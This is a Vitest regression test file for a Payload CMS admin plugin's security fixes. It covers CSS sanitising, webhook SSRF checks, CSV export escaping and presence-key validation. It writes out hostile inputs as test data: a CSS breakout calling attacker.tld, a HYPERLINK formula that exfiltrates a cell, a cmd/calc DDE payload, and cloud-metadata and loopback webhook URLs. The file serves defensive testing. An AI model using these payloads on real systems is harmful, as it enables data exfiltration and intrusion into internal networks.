import { describe, it, expect } from 'vitest'
import type { Field } from 'payload'

import { createAdminUiProSettingsGlobal } from '../globals/AdminUiProSettings.js'
import { createActivityEndpoints } from '../modules/activity/endpoints.js'
import { generateCustomCSS, generateThemeCSS } from '../utils/themeApplier.js'
import { THEME_PRESETS } from '../styles/theme-presets.js'
import { escapeCsvCell } from '../modules/list-views/ExportButton.js'
import { sanitizeCSS } from '../modules/branding/LoginBackground.js'
import { assertSafeWebhookUrl, BlockedWebhookUrlError } from '../utils/ssrf.js'

/**
 * The security pass closed eight holes. These cases pin the SECOND constraint:
 * every legitimate path it broke on the way, and the proof that repairing it
 * does not hand the hole back. Each `it` fails if the regression returns —
 * and, where the repair loosens a check, it also asserts the guard that now
 * carries the weight.
 */

const CONFIG = { admin: { user: 'users' } }

const BREAKOUT =
  'hsl(1) } html:root * { } body::after { content: ""; background: url(https://attacker.tld/c) } .x{'

/** Depth-first lookup of a named field through groups, tabs, rows, arrays. */
function findField(fields: Field[], name: string): any {
  for (const field of fields) {
    if ((field as any).name === name) return field
    const nested: Field[] = [
      ...((field as any).fields || []),
      ...(((field as any).tabs || []).flatMap((t: any) => t.fields || [])),
    ]
    if (nested.length) {
      const hit = findField(nested, name)
      if (hit) return hit
    }
  }
  return undefined
}

function validatorFor(name: string, config: Record<string, unknown> = {}) {
  const global = createAdminUiProSettingsGlobal(config as never)
  const field = findField(global.fields, name)
  if (!field?.validate) throw new Error(`no validate on field ${name}`)
  return field.validate as (value: unknown, options: any) => true | string
}

// ── A stored value that no longer conforms must not freeze the global ───────

describe('settings global stays saveable after the validators tightened', () => {
  it('accepts a custom colour it would refuse today, when the save does not touch it', () => {
    const validate = validatorFor('customAccent')

    // The admin panel posts every field back. Judging the stored value again
    // made the whole global un-saveable — logo, modules, the offending field
    // itself, all frozen behind one 400 with no way out of the UI.
    expect(validate(BREAKOUT, { previousValue: BREAKOUT })).toBe(true)

    // ...and the value stays inert: the render-time net is what actually
    // protects the admin pages, so nothing is handed back by grandfathering.
    expect(generateCustomCSS(BREAKOUT)).toBe('')
  })

  it('still refuses that same value the moment it is introduced or changed', () => {
    const validate = validatorFor('customAccent')
    expect(validate(BREAKOUT, {})).not.toBe(true)
    expect(validate(BREAKOUT, { previousValue: undefined })).not.toBe(true)
    expect(validate(BREAKOUT, { previousValue: 'hsl(250, 84%, 60%)' })).not.toBe(true)
    expect(validate('hsl(250, 84%, 60%)', {})).toBe(true)
  })

  it('grandfathers the three secondary colours too — they had no validator at all before', () => {
    for (const name of ['customGreen', 'customAmber', 'customRed']) {
      const validate = validatorFor(name)
      // Anything could be in the database: these fields shipped unvalidated,
      // and `admin.condition` hides them unless the preset is 'custom', so a
      // rejected legacy value is not even reachable to be cleared.
      expect(validate('var(--brand-green)', { previousValue: 'var(--brand-green)' }), name).toBe(true)
      expect(validate(BREAKOUT, { previousValue: 'hsl(150, 60%, 40%)' }), name).not.toBe(true)
    }
  })
})

// ── The webhook allowlist has to exist on both sides ────────────────────────

describe('webhook URL field validation', () => {
  const opts = (extra: Record<string, unknown> = {}) => ({ siblingData: { channel: 'webhook' }, ...extra })

  it('lets a host store the internal target its own config declares', async () => {
    const withAllowlist = validatorFor('webhookUrl', {
      activity: { webhookAllowedHosts: ['10.0.0.5'] },
    })
    // `activity.webhookAllowedHosts` is the documented escape hatch for a
    // self-hosted n8n. The runtime guard honoured it; the field validator did
    // not, so the setting could never be entered — a feature declared and
    // unreachable.
    expect(withAllowlist('https://10.0.0.5/hook/x', opts())).toBe(true)
    await expect(
      assertSafeWebhookUrl('https://10.0.0.5/hook/x', { allowedHosts: ['10.0.0.5'] }),
    ).resolves.toBeInstanceOf(URL)
  })

  it('refuses the same host when no allowlist declares it', async () => {
    const plain = validatorFor('webhookUrl')
    expect(plain('https://10.0.0.5/hook/x', opts())).not.toBe(true)
    expect(plain('https://169.254.169.254/latest/meta-data/', opts())).not.toBe(true)
    await expect(assertSafeWebhookUrl('https://10.0.0.5/hook/x')).rejects.toBeInstanceOf(
      BlockedWebhookUrlError,
    )
  })

  it('keeps a pre-existing rule editable without letting it fire', async () => {
    const plain = validatorFor('webhookUrl')
    const legacy = 'https://127.0.0.1:8080/hook'

    // Saving the global with the rule untouched works…
    expect(plain(legacy, opts({ previousValue: legacy }))).toBe(true)
    // …but the request is still refused where it counts, at fire time.
    await expect(assertSafeWebhookUrl(legacy)).rejects.toBeInstanceOf(BlockedWebhookUrlError)
    // And pointing the rule somewhere new is judged in full.
    expect(plain('https://192.168.1.10/hook', opts({ previousValue: legacy }))).not.toBe(true)
    expect(plain('https://hooks.slack.com/services/T/B/x', opts({ previousValue: legacy }))).toBe(true)
  })
})

// ── Presence must keep working on a host that does not use kebab slugs ──────

describe('presence key shape', () => {
  const endpoints = createActivityEndpoints('activity-log', 90)
  const handler = (path: string, method: string) => {
    const ep = endpoints.find((e: any) => e.path === path && e.method === method)
    if (!ep) throw new Error(`no endpoint ${method} ${path}`)
    return ep.handler as (req: unknown) => Promise<Response>
  }
  const post = handler('/admin-ui-pro/presence', 'post')
  const get = handler('/admin-ui-pro/presence', 'get')
  const del = handler('/admin-ui-pro/presence', 'delete')

  let seq = 0
  const admin = (extra: Record<string, unknown> = {}) => ({
    id: `hr${(seq += 1)}-${Date.now()}`,
    collection: 'users',
    ...extra,
  })

  it('accepts a camelCase collection slug — Payload does not force lowercase', async () => {
    const user = admin({ email: 'lead@example.com' })
    const key = 'presence:myCollection:6d1f2a3b-0000-4aaa-8bbb-000000000001'

    // PresenceIndicator copies the segment out of the admin URL as-is. A
    // lowercase-only pattern answered 400 to every heartbeat and served an
    // empty editor list, silently, for ever.
    const beat = await post({ user, payload: { config: CONFIG }, json: async () => ({ key }) })
    expect(beat.status).toBe(200)

    const res = await get({
      user: admin(),
      payload: { config: CONFIG },
      url: `/api/admin-ui-pro/presence?key=${encodeURIComponent(key)}`,
    })
    expect(res.status).toBe(200)
    expect((await res.json()).editors[0].userName).toBe('lead@example.com')
  })

  it('still refuses a key that is not a presence key', async () => {
    for (const key of ['anything-i-like', 'presence:users', 'presence::1', `presence:x:${'a'.repeat(80)}`]) {
      const res = await post({ user: admin(), payload: { config: CONFIG }, json: async () => ({ key }) })
      expect(res.status, key).toBe(400)
    }
  })

  it('rate limits the leave call the README already promised was limited', async () => {
    const user = admin()
    const req = { user, payload: { config: CONFIG }, json: async () => ({ key: 'presence:posts:1' }) }
    for (let i = 0; i < 30; i++) {
      expect((await del(req)).status).toBe(200)
    }
    expect((await del(req)).status).toBe(429)
  })
})

// ── Exports must stay usable as data ────────────────────────────────────────

describe('CSV export escaping', () => {
  it('leaves a negative number a number', () => {
    // Neutralising every `-` turned amounts and deltas into text cells: no
    // sum, string sort, a warning triangle on each one.
    expect(escapeCsvCell(-42)).toBe('-42')
    expect(escapeCsvCell('-12.5')).toBe('-12.5')
  })

  it('still neutralises everything that is not one', () => {
    expect(escapeCsvCell('=HYPERLINK("https://attacker.tld/?d="&A2,"Click")')).toContain("'=")
    expect(escapeCsvCell('-2+3+cmd|\'/c calc\'!A1')).toMatch(/^'-/)
    expect(escapeCsvCell('@SUM(1+1)')).toMatch(/^'@/)
    expect(escapeCsvCell('+1 555 0100')).toMatch(/^'\+/)
  })
})

// ── The two sinks left on the old controls ──────────────────────────────────

describe('remaining CSS sinks', () => {
  it('cannot close the comment a pasted theme name sits in', () => {
    const tampered = JSON.parse(JSON.stringify(THEME_PRESETS[0]))
    tampered.name = 'Nice */ body { display: none } /*'
    const css = generateThemeCSS(tampered)
    expect(css).toContain('--aup-accent')

    // The guarantee is positional: the first comment terminator in the sheet
    // must still be the one the template wrote. Anything the name carries
    // stays trapped behind it, inert.
    expect(css.slice(0, css.indexOf('*/'))).toContain('auto-generated')
    expect(css).not.toContain('*/ body')
  })

  it('cannot append a declaration to the login-page rule', () => {
    // Rendered inside a <style> on the unauthenticated login page. Braces were
    // already stripped; `;` was the remaining lever.
    const hostile = sanitizeCSS('/logo.png) !important; background: url(https://attacker.tld/p)')
    expect(hostile).not.toContain(';')
    expect(hostile).not.toContain('{')
  })

  it('keeps a data: URI background intact', () => {
    const legit = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iIi8+'
    expect(sanitizeCSS(legit)).toBe(legit)
  })
})
